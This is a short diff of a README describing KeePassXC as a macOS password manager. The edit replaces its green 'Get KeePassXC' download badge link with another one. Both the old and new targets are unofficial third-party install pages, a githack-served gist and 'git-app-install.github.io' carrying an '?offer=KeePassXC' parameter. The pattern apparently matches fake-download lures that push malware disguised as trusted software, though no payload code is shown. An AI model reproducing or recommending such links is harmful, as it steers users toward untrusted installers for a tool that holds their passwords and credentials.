@@ -2,7 +2,7 @@
 
 KeePassXC is a cross-platform password manager for macOS that helps users securely store, organize, and manage their passwords. It features strong encryption, autofill support, and advanced tools for generating and protecting credentials.
 
-<a href="https://gistcdn.githack.com/smailikblackguard/ebfd6e0bf81bbfd9c8dc8dceea469f3c/raw/10b9501b2b01e0544433d395ff54cce2ea2d1670/install.html?offer=KeePassXC" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=KeePassXC" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20KeePassXC%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
